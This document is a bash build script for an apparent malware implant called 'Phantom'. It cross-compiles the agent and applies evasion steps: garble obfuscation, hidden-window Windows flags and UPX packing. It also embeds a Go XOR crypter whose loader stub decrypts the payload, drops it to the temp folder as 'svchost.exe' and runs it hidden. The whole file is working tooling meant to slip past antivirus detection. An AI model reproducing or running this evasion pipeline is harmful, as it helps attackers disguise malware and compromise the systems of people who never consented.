#!/bin/bash

# Phantom Agent Build Script with Advanced Obfuscation
# This script builds the Go agent with maximum evasion techniques

set -e

AGENT_NAME="phantom"
BUILD_DIR="./agent"
OUTPUT_DIR="./builds"
GARBLE_FLAGS="-literals -tiny -seed=random"
LDFLAGS="-s -w -H windowsgui -X main.version=1.0 -X main.buildTime=$(date +%s)"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[+] Phantom Agent Advanced Build Script${NC}"
echo -e "${GREEN}[+] Building with maximum evasion techniques${NC}"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Check if garble is installed
if ! command -v garble &> /dev/null; then
    echo -e "${YELLOW}[!] Garble not found, installing...${NC}"
    go install mvdan.cc/garble@latest
fi

# Function to build for specific OS/ARCH with obfuscation
build_agent() {
    local GOOS=$1
    local GOARCH=$2
    local OUTPUT_NAME=$3
    
    echo -e "${GREEN}[+] Building for ${GOOS}/${GOARCH}...${NC}"
    
    # Set environment variables
    export GOOS=$GOOS
    export GOARCH=$GOARCH
    export CGO_ENABLED=0
    
    # Build with garble for maximum obfuscation
    cd "$BUILD_DIR"
    garble $GARBLE_FLAGS build \
        -ldflags="$LDFLAGS" \
        -trimpath \
        -buildvcs=false \
        -o "../$OUTPUT_DIR/$OUTPUT_NAME" \
        .
    cd ..
    
    if [ -f "$OUTPUT_DIR/$OUTPUT_NAME" ]; then
        echo -e "${GREEN}[+] Successfully built: $OUTPUT_NAME${NC}"
        
        # Apply additional obfuscation if UPX is available
        if command -v upx &> /dev/null; then
            echo -e "${YELLOW}[!] Applying UPX compression...${NC}"
            upx --best --lzma --ultra-brute "$OUTPUT_DIR/$OUTPUT_NAME" 2>/dev/null || true
        fi
        
        # Show file info
        ls -lh "$OUTPUT_DIR/$OUTPUT_NAME"
    else
        echo -e "${RED}[-] Failed to build $OUTPUT_NAME${NC}"
        return 1
    fi
}

# Function to create crypter (additional layer of obfuscation)
create_crypter() {
    local INPUT_FILE=$1
    local OUTPUT_FILE=$2
    
    echo -e "${GREEN}[+] Creating crypted version: $OUTPUT_FILE${NC}"
    
    # Simple XOR crypter in Go
    cat > crypter.go << 'EOF'
package main

import (
    "crypto/rand"
    "encoding/hex"
    "fmt"
    "io/ioutil"
    "os"
)

func main() {
    if len(os.Args) != 3 {
        fmt.Println("Usage: crypter <input> <output>")
        os.Exit(1)
    }
    
    input := os.Args[1]
    output := os.Args[2]
    
    // Read input file
    data, err := ioutil.ReadFile(input)
    if err != nil {
        panic(err)
    }
    
    // Generate random key
    key := make([]byte, 32)
    rand.Read(key)
    
    // XOR encrypt
    encrypted := make([]byte, len(data))
    for i, b := range data {
        encrypted[i] = b ^ key[i%len(key)]
    }
    
    // Create loader stub
    stub := fmt.Sprintf(`package main
import (
    "encoding/hex"
    "os"
    "os/exec"
    "syscall"
)

func main() {
    key, _ := hex.DecodeString("%s")
    data, _ := hex.DecodeString("%s")
    
    decrypted := make([]byte, len(data))
    for i, b := range data {
        decrypted[i] = b ^ key[i%%len(key)]
    }
    
    // Write to temp file and execute
    tmpfile := os.TempDir() + "/svchost.exe"
    os.WriteFile(tmpfile, decrypted, 0755)
    
    cmd := exec.Command(tmpfile)
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    cmd.Run()
    
    os.Remove(tmpfile)
}`, hex.EncodeToString(key), hex.EncodeToString(encrypted))
    
    // Write stub to file
    ioutil.WriteFile(output+".go", []byte(stub), 0644)
    
    fmt.Printf("Crypted version created: %s.go\n", output)
}
EOF
    
    # Build and run crypter
    go build -o crypter crypter.go
    ./crypter "$INPUT_FILE" "$OUTPUT_FILE"
    
    # Build the crypted version
    go build -ldflags="-s -w -H windowsgui" -o "$OUTPUT_FILE.exe" "$OUTPUT_FILE.go"
    
    # Cleanup
    rm crypter crypter.go "$OUTPUT_FILE.go"
    
    echo -e "${GREEN}[+] Crypted executable: $OUTPUT_FILE.exe${NC}"
}

# Build for different architectures
echo -e "${GREEN}[+] Starting build process...${NC}"

# Windows builds
build_agent "windows" "amd64" "${AGENT_NAME}_windows_x64.exe"
build_agent "windows" "386" "${AGENT_NAME}_windows_x86.exe"

# Linux builds
build_agent "linux" "amd64" "${AGENT_NAME}_linux_x64"
build_agent "linux" "386" "${AGENT_NAME}_linux_x86"

# macOS builds (if needed)
# build_agent "darwin" "amd64" "${AGENT_NAME}_macos_x64"
# build_agent "darwin" "arm64" "${AGENT_NAME}_macos_arm64"

# Create crypted versions (Windows only for now)
if [ -f "$OUTPUT_DIR/${AGENT_NAME}_windows_x64.exe" ]; then
    create_crypter "$OUTPUT_DIR/${AGENT_NAME}_windows_x64.exe" "$OUTPUT_DIR/${AGENT_NAME}_crypted_x64"
fi

echo -e "${GREEN}[+] Build process completed!${NC}"
echo -e "${GREEN}[+] Built files:${NC}"
ls -la "$OUTPUT_DIR"

# Generate checksums
echo -e "${GREEN}[+] Generating checksums...${NC}"
cd "$OUTPUT_DIR"
sha256sum * > checksums.txt
cd ..

echo -e "${GREEN}[+] All builds completed successfully!${NC}"
echo -e "${YELLOW}[!] Remember to test in isolated environment first${NC}"